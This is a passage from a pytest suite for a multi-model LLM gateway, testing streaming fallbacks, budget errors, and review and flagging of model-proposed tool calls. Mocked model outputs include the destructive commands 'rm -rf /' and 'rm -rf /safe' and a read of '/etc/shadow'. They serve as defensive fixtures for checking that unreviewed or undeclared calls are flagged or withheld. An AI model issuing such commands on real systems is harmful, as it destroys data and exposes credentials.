# TOOL_DECIDED_PATH -- an agreeing shape would trip Task 6's own `decided`
# short-circuit and never reach the fuser at all, proving nothing about this
# fallback path. No `tools`/`tool_choice` on the client request; a panel
# member emitting `content: null` + `tool_calls` unprompted is a shape a
# provider with server-side tools can produce on its own.

def test_streaming_tool_call_fallback_after_a_dead_fuser_is_delivered_as_a_chunk_stream(
        tmp_path, monkeypatch):
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(500, json={})               # fuser dead
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        # Candidate call: tool-calls only, no prose -- unprompted, and
        # disagreeing across panel members (see the comment above).
        name = "get_weather" if body.get("model") == "a" else "get_time"
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "call_1", "type": "function",
                 "function": {"name": name, "arguments": "{}"}}]},
                        "finish_reason": "tool_calls"}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        rid = r.headers["x-fusion-trace-id"]
        raw = b"".join(r.iter_bytes()).decode()
    assert ": fusion fusing" in raw          # the panel succeeded before the fuser died
    assert raw.rstrip().endswith("data: [DONE]")
    objs = [json.loads(l[6:]) for l in raw.splitlines()
            if l.startswith("data: ") and l[6:].strip() != "[DONE]"]
    assert all("error" not in o for o in objs), raw
    # best_candidate prefers configured panel order -- "a" -- whose call is
    # "get_weather".
    assert any(o["choices"][0]["delta"].get("tool_calls", [{}])[0]
               .get("function", {}).get("name") == "get_weather" for o in objs)
    assert any(o["choices"][0].get("finish_reason") == "tool_calls" for o in objs)
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute(
        "SELECT model, state, usage_source FROM ledger WHERE request_id=? ORDER BY id",
        (rid,)).fetchall()
    # 2 candidates + 2 reviews + 1 fuser -- exact row count for this branch.
    assert len(rows) == 5
    # The fuser's own row must be fail()ed -- it never reached a first byte,
    # so it is never settled as a paid success, and never left in
    # 'preflight'.
    assert rows[-1] == ("b", "failed", None)


def test_streaming_dead_fuser_fallback_survives_a_null_function_tool_call(tmp_path, monkeypatch):
    # M9 Task 6 review round 1, finding 2 (Important): `c.get("function",
    # {}).get("name", "")` only substitutes the `{}` default when the KEY is
    # missing, not when it's present with a `null` value -- an
    # upstream-controlled shape. `None.get(...)` raised AttributeError mid-
    # stream, and by then `_finish_request(..., "succeeded", ...)` had
    # already run, so the request logged as succeeded while the client's
    # stream aborted with no [DONE]. The `decided` path can't reach this
    # (`canonical_calls` rejects a non-dict `function` before a call can win
    # tool_fast/tool_reviewed/tool_plurality) -- only the dead-fuser
    # fallback can, which this task newly opened.
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(500, json={})               # fuser dead
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        # "a" (panel order's preferred survivor) carries a hostile
        # `function: null` call; "b" disagrees with a normal one, so
        # decide_tools can't resolve the panel structurally and the fuser
        # genuinely gets called (and dies).
        if body.get("model") == "a":
            return httpx.Response(200, json={
                "choices": [{"message": {"content": None, "tool_calls": [
                    {"id": "call_1", "type": "function", "function": None}]},
                            "finish_reason": "tool_calls"}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "call_2", "type": "function",
                 "function": {"name": "get_time", "arguments": "{}"}}]},
                        "finish_reason": "tool_calls"}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        raw = b"".join(r.iter_bytes()).decode()
    assert ": fusion fusing" in raw
    # Must complete cleanly -- an unguarded AttributeError inside the
    # generator aborts the stream mid-write with no [DONE] and no error
    # envelope (StreamingResponse has no hook to catch it after headers are
    # already committed).
    assert raw.rstrip().endswith("data: [DONE]")
    objs = [json.loads(l[6:]) for l in raw.splitlines()
            if l.startswith("data: ") and l[6:].strip() != "[DONE]"]
    assert all("error" not in o for o in objs), raw
    # The hostile call's null `function` renders as an empty name/arguments
    # pair rather than crashing.
    assert any(o["choices"][0]["delta"].get("tool_calls", [{}])[0].get("id") == "call_1"
               and o["choices"][0]["delta"]["tool_calls"][0]["function"] == {"name": "", "arguments": ""}
               for o in objs)
    assert any(o["choices"][0].get("finish_reason") == "tool_calls" for o in objs)


def test_streaming_empty_fuser_stream_falls_back_to_the_best_candidate(tmp_path, monkeypatch):
    """The fuser answers 200 with a genuinely empty body -- no bytes at all,
    distinct from an upstream error. Without an explicit `first_byte` guard
    after the read loop this falls through to ledger.settle + 'succeeded',
    charging the caller for a stream that decodes to zero chunks and no
    [DONE] under a real SSEDecoder. The gateway already holds the right
    answer via best_candidate and must serve it instead."""
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(200, content=b"",
                                  headers={"content-type": "text/event-stream"})
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return httpx.Response(200, json={
            "choices": [{"message": {"content": f"answer from {body['model']}"}}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        rid = r.headers["x-fusion-trace-id"]
        raw = b"".join(r.iter_bytes()).decode()
    assert ": fusion fusing" in raw
    assert raw.rstrip().endswith("data: [DONE]")
    contents = []
    for line in raw.splitlines():
        if line.startswith(": ") or not line.startswith("data: "):
            continue
        payload = line[6:].strip()
        if payload == "[DONE]":
            continue
        obj = json.loads(payload)
        assert "error" not in obj, f"empty fuser body billed silently: {obj}"
        content = obj["choices"][0]["delta"].get("content")
        if content:
            contents.append(content)
    assert contents == ["answer from a"]
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute("SELECT model, state FROM ledger WHERE request_id=? ORDER BY id",
                        (rid,)).fetchall()
    assert len(rows) == 5
    # The fuser's own row must be fail()ed -- never settled as a paid
    # success, and never left in 'preflight'.
    assert rows[-1] == ("b", "failed")


# -- Final whole-branch review, finding 7: the streaming fuser's bound was
# wall-clock, not the per-chunk idle bound its own comment claims.

def test_streaming_fuser_deadline_resets_per_chunk_not_wall_clock(tmp_path, monkeypatch):
    """stage_timeout_s=1; the fuser emits a chunk every 0.3s (never idle more
    than 0.3s) for 8 chunks -- ~2.4s of real time, comfortably over the 1s
    budget in wall-clock terms but never idle anywhere near it. Before the
    fix `deadline` was computed once before the loop and never reset, so
    `remaining` hit zero around t=1s regardless of how recently a chunk
    arrived, truncating the stream after 3 chunks with a spurious
    stream_failed -- exactly what app.py's own comment at the wait_for call
    says must NOT happen ('a fuser that is genuinely still producing output
    at the deadline isn't cut off mid-token, only one that goes quiet is').
    """
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            chunks = [
                (f'data: {{"choices":[{{"index":0,"delta":{{"content":"{i}"}},'
                 f'"finish_reason":null}}]}}\n\n').encode()
                for i in range(8)]
            chunks.append(b'data: {"choices":[],"usage":{"prompt_tokens":3,"completion_tokens":4}}\n\n')
            chunks.append(b"data: [DONE]\n\n")
            return httpx.Response(200, headers={"content-type": "text/event-stream"},
                                  stream=DelayedByteStream(chunks, 0.3))
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return httpx.Response(200, json={
            "choices": [{"message": {"content": "candidate answer"}}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})

    cfg = CFG.replace("stage_timeout_s = 5", "stage_timeout_s = 1")
    c = make_client(tmp_path, monkeypatch, h=h, cfg=cfg)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        raw = b"".join(r.iter_bytes()).decode()

    assert "stream_failed" not in raw, f"stream was cut short:\n{raw}"
    assert raw.rstrip().endswith("data: [DONE]")
    contents = []
    for line in raw.splitlines():
        if line.startswith(": ") or not line.startswith("data: "):
            continue
        payload = line[6:].strip()
        if payload == "[DONE]":
            continue
        obj = json.loads(payload)
        if obj.get("choices"):
            content = obj["choices"][0]["delta"].get("content")
            if content is not None:
                contents.append(content)
    assert contents == [str(i) for i in range(8)], (
        f"expected all 8 chunks, got {contents!r} -- the stream was cut off "
        f"by a wall-clock deadline instead of an idle one")


class _BrokenMidStream(httpx.AsyncByteStream):
    """Yields one truncated raw chunk (no line terminator, mid-token) then
    blows up -- simulates a real upstream connection dropping mid-flight."""
    def __init__(self, first_chunk: bytes):
        self.first_chunk = first_chunk

    async def __aiter__(self):
        yield self.first_chunk
        raise RuntimeError("upstream connection dropped")

    async def aclose(self) -> None:
        pass


def test_streaming_fuser_mid_stream_error_does_not_glue_onto_a_truncated_chunk(tmp_path, monkeypatch):
    """Final whole-branch review, finding 2 (CRITICAL), fusion path. Same bug
    as test_streaming.py's single-model pin, but for the fuser's own stream
    -- M8 makes streaming fusion the default, so this is now the common
    path. Reproduced end to end against the real openai SDK decoder."""
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            # A COMPLETE, valid data line -- the connection drops before the
            # blank-line terminator that would normally follow it. That gap
            # is exactly what the \n\n-prefix fix closes; a chunk cut
            # mid-token produces unparseable JSON on its own regardless of
            # what follows, which would not isolate this bug.
            truncated = b'data: {"id":"x","choices":[{"index":0,"delta":{"content":"wor"},"finish_reason":null}]}'
            return httpx.Response(200, headers={"content-type": "text/event-stream"},
                                  stream=_BrokenMidStream(truncated))
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return httpx.Response(200, json={
            "choices": [{"message": {"content": "candidate answer"}}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1}})

    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        raw = b"".join(r.iter_bytes())
    assert b"stream_failed" in raw

    from openai import OpenAI
    client = OpenAI(api_key="x", base_url="http://test",
                    http_client=httpx.Client(transport=httpx.MockTransport(
                        lambda req: httpx.Response(200, content=raw,
                            headers={"content-type": "text/event-stream"}))))
    stream = client.chat.completions.create(
        model="fusion", messages=[{"role": "user", "content": "hi"}], stream=True)
    try:
        list(stream)
    except Exception as e:
        assert not isinstance(e, json.JSONDecodeError), (
            f"the error envelope glued onto a truncated upstream line and "
            f"broke the real SDK's decoder: {e!r}\nraw={raw!r}")


def test_non_streaming_budget_trip_at_the_fuser_returns_503_not_500(tmp_path, monkeypatch):
    """The panel succeeds (2 candidates + 2 reviews settle under the cap);
    only the fuser's OWN preflight -- inside call_model, called bare from
    _finish_fusion -- crosses it. Before the fix this propagated out of the
    handler as an unhandled BudgetTripped -> gateway 500, with the
    `requests` row stranded 'open'."""
    c = make_client(tmp_path, monkeypatch, cfg=BUDGET_CFG)
    r = c.post("/v1/chat/completions", json=BUDGET_BODY, headers=H())
    assert r.status_code == 503
    assert r.json()["error"]["type"] == "budget_exhausted"
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute("SELECT model, state FROM ledger").fetchall()
    assert len(rows) == 4                       # panel settled; no stray fuser row
    assert all(state == "settled" for _, state in rows), rows
    status = conn.execute(
        "SELECT status FROM requests WHERE id != 'admin'").fetchone()
    assert status[0] == "failed"                # never left 'open'


def test_streaming_budget_trip_at_the_fuser_emits_an_error_not_a_crash(tmp_path, monkeypatch):
    """Same budget shape as the non-streaming test above, but the client
    already has an open SSE stream by the time the fuser's preflight trips:
    status is 200 (headers are already committed) and the trip must surface
    as a single well-formed error data line, not an unhandled exception that
    kills the connection mid-stream."""
    c = make_client(tmp_path, monkeypatch, cfg=BUDGET_CFG)
    with c.stream("POST", "/v1/chat/completions",
                  json={**BUDGET_BODY, "stream": True}, headers=H()) as r:
        assert r.status_code == 200
        raw = b"".join(r.iter_bytes()).decode()
    assert ": fusion fusing" in raw             # the panel succeeded first
    data_lines = [l for l in raw.splitlines() if l.startswith("data: ")]
    assert len(data_lines) == 1
    assert json.loads(data_lines[0][6:])["error"]["type"] == "budget_exhausted"
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute("SELECT model, state FROM ledger").fetchall()
    assert len(rows) == 4
    assert all(state == "settled" for _, state in rows), rows


# -- Task 5 fix round 1, finding 4: every tool-decided path returns a
# 1-candidate PanelResult, which used to trip _finish_fusion's
# `len(panel.candidates) < 2` guard unconditionally -- source="candidate",
# meta["degraded"] = True, and a `fusion.degraded {"rung":"single_candidate"}`
# event, on what is actually a HEALTHY fast path. Production metrics would
# have counted every successful tool_fast/tool_reviewed/tool_plurality
# request as a degradation. `panel.path in TOOL_DECIDED_PATHS` is what lets
# `_finish_fusion` (and the meta built around it) tell "decided structurally,
# fuser deliberately skipped" apart from "we lost candidates".
#
# Both tests below send a request whose BODY carries no `tools`/`tool_choice`
# (so app.py's pre-Task-6 bypass gate -- which only inspects the CLIENT's own
# request, never the mocked upstream's response shape -- does not intercept
# it) while the mocked upstream answers candidate calls with a real
# `tool_calls` shape anyway. This is the only way to drive gather_panel's
# tool decision tree through the real HTTP path today; Task 6 removes the
# bypass gate and can simplify this once it does.

def _tool_read_response(model):
    return httpx.Response(200, json={
        "choices": [{"message": {"content": None, "tool_calls": [
            {"id": "call_1", "type": "function",
             "function": {"name": "read", "arguments": "{}"}}]}}],
        "usage": {"prompt_tokens": 1, "completion_tokens": 1}})


def _event_kinds(tmp_path, request_id):
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    return [row[0] for row in conn.execute(
        "SELECT kind FROM events WHERE request_id=?", (request_id,)).fetchall()]


def test_a_healthy_tool_fast_path_is_not_reported_degraded(tmp_path, monkeypatch):
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "VERDICT" in prompt:
            # Never reached on tool_fast (no review is dispatched), but kept
            # honest in case a regression elsewhere sends a and b to review.
            return httpx.Response(200, json={
                "choices": [{"message": {"content":
                    "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return _tool_read_response(body.get("model"))
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json=BODY, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert body["fusion"]["path"] == "tool_fast"
    assert body["fusion"]["degraded"] is False
    assert body["fusion"]["answered_by"] == "candidate"
    msg = body["choices"][0]["message"]
    assert msg["tool_calls"][0]["function"]["name"] == "read"
    rid = r.headers["x-fusion-trace-id"]
    kinds = _event_kinds(tmp_path, rid)
    assert "fusion.degraded" not in kinds


def test_a_genuine_single_candidate_fallback_still_reports_degraded(tmp_path, monkeypatch):
    # Mirrors the test above but with model "b" genuinely down -- only "a"
    # survives, decide_tools never even runs the tool decision tree
    # (`less than 2 candidates` -> "prose" is never reached because there
    # is only ONE candidate, `is_consensus` needs two), and the panel takes
    # the pre-existing "full" path with a single degraded candidate. This
    # is NOT a TOOL_DECIDED_PATH, so the fix must not have silenced it.
    def h(req):
        body = json.loads(req.content)
        if body.get("model") == "b":
            return httpx.Response(500, json={})
        prompt = body["messages"][-1]["content"]
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": "VERDICT a correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return _tool_read_response(body.get("model"))
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json=BODY, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert body["fusion"]["path"] not in ("tool_fast", "tool_reviewed", "tool_plurality")
    assert body["fusion"]["degraded"] is True
    assert body["fusion"]["answered_by"] == "candidate"
    rid = r.headers["x-fusion-trace-id"]
    kinds = _event_kinds(tmp_path, rid)
    assert "fusion.degraded" in kinds


# -- Final whole-branch review, finding 1 (CRITICAL). The fusion prompt used
# to tell the fuser to "state the corrected one in the same TOOL_CALL form"
# -- text `render_candidate` renders for display, but nothing in gateway/
# parses back into a call (`_extract_message` only ever reads
# `message.tool_calls`). A fuser that obeyed that wording answered in prose,
# and the client got `finish_reason: "stop"` for a conversation that called
# for an action, with no signal -- reachable on every escalation path a
# disagreeing tool-carrying panel reaches the fuser through. The fix has two
# halves: the prompt now points the fuser at the real tool-calling API
# (pinned in test_fusion_prompts.py), and `_finish_fusion` treats a fuser
# `Candidate` with no `tool_calls`, on a panel that held some, as a fuser
# failure -> `best_candidate`, exercised end to end here.

def _disagreeing_bash_candidate(body):
    arg = "a" if body.get("model") == "a" else "b"
    return httpx.Response(200, json={
        "choices": [{"message": {"content": None, "tool_calls": [
            {"id": "c1", "type": "function",
             "function": {"name": "bash", "arguments": f'{{"cmd":"{arg}"}}'}}]}}],
        "usage": {"prompt_tokens": 3, "completion_tokens": 4}})


def test_a_fuser_that_answers_in_prose_on_a_tool_carrying_panel_falls_back_to_a_real_call(
        tmp_path, monkeypatch):
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            # Reproduces the exact failure the old rule invited: the fuser
            # answers in the TOOL_CALL text form instead of through the
            # tool-calling API. `tool_calls` is absent from this response.
            return httpx.Response(200, json={
                "choices": [{"message": {
                    "content": 'TOOL_CALL bash {"cmd":"rm -rf /safe"}'}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content":
                    "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        # "a" and "b" DISAGREE (different arguments), so decide_tools cannot
        # resolve the panel structurally and the fuser is genuinely reached.
        return _disagreeing_bash_candidate(body)
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json={
        "model": "fusion", "messages": [{"role": "user", "content": "clean up"}],
        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
    }, headers=H())
    assert r.status_code == 200
    body = r.json()
    msg = body["choices"][0]["message"]
    # The bug this finding measured: prose served with finish_reason "stop"
    # for a conversation that called for an action, with no signal.
    assert body["choices"][0]["finish_reason"] == "tool_calls"
    assert msg["tool_calls"], "fuser prose was served instead of a real call"
    assert msg["tool_calls"][0]["function"]["name"] == "bash"
    assert "TOOL_CALL" not in (msg.get("content") or "")
    assert body["fusion"]["answered_by"] == "candidate"   # not "fuser"
    assert body["fusion"]["degraded"] is True


def test_streaming_fuser_that_answers_in_prose_on_a_tool_carrying_panel_falls_back_to_a_real_call(
        tmp_path, monkeypatch):
    # Streaming twin. `_finish_fusion`'s fuser call is always a genuine
    # non-streaming upstream request (fuser_body never sets `stream`), so
    # the mock's fuser branch below is identical to the non-streaming test's
    # -- the whole point of routing a tool-carrying panel's fuser call
    # through the buffered `_finish_fusion` rather than a live byte relay.
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {
                    "content": 'TOOL_CALL bash {"cmd":"rm -rf /safe"}'}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content":
                    "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return _disagreeing_bash_candidate(body)
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions", json={
        "model": "fusion", "stream": True,
        "messages": [{"role": "user", "content": "clean up"}],
        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
    }, headers=H()) as r:
        assert r.status_code == 200
        raw = b"".join(r.iter_bytes()).decode()
    assert "TOOL_CALL" not in raw
    assert '"error"' not in raw
    assert raw.rstrip().endswith("data: [DONE]")
    objs = [json.loads(l[6:]) for l in raw.splitlines()
            if l.startswith("data: ") and l[6:].strip() != "[DONE]"]
    assert any(o["choices"][0]["delta"].get("tool_calls", [{}])[0]
               .get("function", {}).get("name") == "bash" for o in objs)
    assert any(o["choices"][0].get("finish_reason") == "tool_calls" for o in objs)


def test_streaming_tool_carrying_panel_with_a_genuinely_successful_fuser(tmp_path, monkeypatch):
    # Regression pin for the refactor above: a tool-carrying panel that
    # reaches a fuser which DOES answer through the tool-calling API must
    # still stream that real call -- not just the failure branch.
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content": None, "tool_calls": [
                    {"id": "c1", "type": "function",
                     "function": {"name": "bash", "arguments": '{"cmd":"fused"}'}}]}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content":
                    "VERDICT a wrong no\nVERDICT b wrong no"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return _disagreeing_bash_candidate(body)
    c = make_client(tmp_path, monkeypatch, h=h)
    with c.stream("POST", "/v1/chat/completions", json={
        "model": "fusion", "stream": True,
        "messages": [{"role": "user", "content": "clean up"}],
        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
    }, headers=H()) as r:
        assert r.status_code == 200
        raw = b"".join(r.iter_bytes()).decode()
    assert raw.rstrip().endswith("data: [DONE]")
    objs = [json.loads(l[6:]) for l in raw.splitlines()
            if l.startswith("data: ") and l[6:].strip() != "[DONE]"]
    assert any(o["choices"][0]["delta"].get("tool_calls", [{}])[0]
               .get("function", {}).get("arguments") == '{"cmd":"fused"}' for o in objs)
    assert any(o["choices"][0].get("finish_reason") == "tool_calls" for o in objs)


# -- Final whole-branch review, finding 2 (Important). A write-class call
# could be emitted with no clean review and no fuser decision behind it, and
# `path` alone did not say so. `unreviewed_write_call` (meta field, plus a
# distinct `fusion.degraded` rung) names this apart from a benign
# degradation, and carries whether a reviewer specifically objected to the
# action about to be executed.

def _write_bash_response():
    return httpx.Response(200, json={
        "choices": [{"message": {"content": None, "tool_calls": [
            {"id": "c1", "type": "function",
             "function": {"name": "bash", "arguments": '{"cmd":"rm -rf /"}'}}]}}],
        "usage": {"prompt_tokens": 1, "completion_tokens": 1}})


def _degraded_payloads(tmp_path, request_id):
    import sqlite3
    conn = sqlite3.connect(tmp_path / "g.sqlite")
    rows = conn.execute("SELECT kind, payload FROM events WHERE request_id=?",
                        (request_id,)).fetchall()
    return [json.loads(p) for k, p in rows if k == "fusion.degraded"]


def test_a_lone_survivor_holding_a_write_class_call_is_flagged_unreviewed(tmp_path, monkeypatch):
    def h(req):
        body = json.loads(req.content)
        if body["model"] == "a":
            return httpx.Response(500, json={})
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(500, json={})     # dead code if reached
        return _write_bash_response()
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json={
        "model": "fusion", "messages": [{"role": "user", "content": "clean up"}],
        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
    }, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert body["choices"][0]["message"]["tool_calls"][0]["function"]["name"] == "bash"
    assert body["fusion"]["degraded"] is True
    assert body["fusion"]["unreviewed_write_call"] is True
    rid = r.headers["x-fusion-trace-id"]
    matches = [p for p in _degraded_payloads(tmp_path, rid)
              if p.get("rung") == "unreviewed_write_call"]
    assert len(matches) == 1
    # No review ran at all here -- distinct from the objection case below.
    assert matches[0]["objected"] is False


def test_a_fuser_failure_after_a_reviewer_objection_flags_the_objection(tmp_path, monkeypatch):
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "Produce the single best final answer" in prompt:
            return httpx.Response(500, json={})           # fuser also dead
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content":
                    "VERDICT a wrong no\nVERDICT b wrong no"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return _write_bash_response()   # a and b agree -- reaches agree_review
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json={
        "model": "fusion", "messages": [{"role": "user", "content": "clean up"}],
        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
    }, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert body["choices"][0]["message"]["tool_calls"][0]["function"]["name"] == "bash"
    assert body["fusion"]["unreviewed_write_call"] is True
    rid = r.headers["x-fusion-trace-id"]
    matches = [p for p in _degraded_payloads(tmp_path, rid)
              if p.get("rung") == "unreviewed_write_call"]
    assert len(matches) == 1
    # A reviewer DID object to the exact call about to be served -- distinct
    # from the lone-survivor case above, where nothing ever reviewed it.
    assert matches[0]["objected"] is True


def test_a_clean_tool_reviewed_emission_is_never_flagged_unreviewed(tmp_path, monkeypatch):
    # Regression guard: `tool_reviewed` legitimately reviewed a write-class
    # agreement and found no objection -- the new signal must not fire here,
    # or every healthy reviewed write call would look identical to an
    # unreviewed one.
    def h(req):
        body = json.loads(req.content)
        prompt = body["messages"][-1]["content"]
        if "VERDICT" in prompt:
            return httpx.Response(200, json={
                "choices": [{"message": {"content":
                    "VERDICT a correct ok\nVERDICT b correct ok"}}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1}})
        return _write_bash_response()
    c = make_client(tmp_path, monkeypatch, h=h)
    r = c.post("/v1/chat/completions", json={
        "model": "fusion", "messages": [{"role": "user", "content": "clean up"}],
        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
    }, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert body["fusion"]["path"] == "tool_reviewed"
    assert body["fusion"]["degraded"] is False
    assert body["fusion"]["unreviewed_write_call"] is False
    rid = r.headers["x-fusion-trace-id"]
    assert "fusion.degraded" not in _event_kinds(tmp_path, rid)


# -- Security finding, 2026-07-30: the gateway classified and emitted tool
# calls the CLIENT never declared, using only a server-side `readonly_tools`
# list (fast path) or the fuser's own free rein over `tools` (fuser path).
# Reproduced through the real app below, against the real vulnerability,
# before any fix: both tests were run RED against HEAD 98defc7 first (see
# declared-tools-report.md for the captured output), then the fix in
# gateway/tool_vote.py / gateway/fusion.py / gateway/app.py made them GREEN.

def test_an_undeclared_readonly_call_is_not_emitted_via_tool_fast(tmp_path, monkeypatch):
    """Finding 1 (fast path): the client declares only `bash`, but both
    quorum candidates propose `read {"path": "/etc/shadow"}` -- a tool the
    client never listed, even though "read" sits in the server's default
    `readonly_tools`. Before the fix, structural agreement alone was enough
    to emit this at `tool_fast` -- `degraded: false`, no review -- because
    classification never looked at what the client actually declared. After
    the fix, `best_candidate`'s declared-tools filter refuses to serve it;
    with nothing usable left in the panel, the request degrades to the
    single-model chain fallback (panel[0], "a") -- the same terminal
    handling a genuinely empty panel already gets, not a bespoke rewrite of
    the call. The raw upstream model's own answer may still say "read" (that
    is not this gateway's to fix -- a direct `model: "a"` request would get
    the same thing) but it now carries no panel-consensus vouching at all:
    no "fusion" wrapper, no "tool_fast", no clean bill of health.
    """
    def h():
        return httpx.Response(200, json={
            "choices": [{"message": {"content": None, "tool_calls": [
                {"id": "c1", "type": "function",
                 "function": {"name": "read",
                              "arguments": '{"path":"/etc/shadow"}'}}]}}],
            "usage": {"prompt_tokens": 3, "completion_tokens": 4}})
    c = make_client(tmp_path, monkeypatch, h=_s_handler(h), cfg=CFG_S)
    r = c.post("/v1/chat/completions", json={
        "model": "fusion",
        "messages": [{"role": "user", "content": "read the shadow file"}],
        "tools": [{"type": "function", "function": {"name": "bash", "parameters": {}}}],
    }, headers=H())
    assert r.status_code == 200
    body = r.json()
    assert "fusion" not in body                    # no panel vouching at all
    assert body["model"] == "a"                     # plain single-model relay
    assert body["choices"][0]["message"]["tool_calls"][0]["function"]["name"] == "read"

    rid = r.headers["x-fusion-trace-id"]
    payloads = _degraded_payloads(tmp_path, rid)
    rungs = {p.get("rung") for p in payloads}
    assert "undeclared_tool_call" in rungs
    assert "no_candidates" in rungs
    assert "zero_candidates_chain_fallback" in rungs
    undeclared = [p for p in payloads if p.get("rung") == "undeclared_tool_call"][0]
    assert undeclared["model"] == "a"

    import sqlite3
    rows = sqlite3.connect(tmp_path / "g.sqlite").execute(
        "SELECT model, state, usage_source FROM ledger WHERE request_id=?",
        (rid,)).fetchall()
    # Exact row count for this branch: 2 quorum candidates + the cancelled
    # slow leg (the panel stage, unchanged -- gather_panel still decides
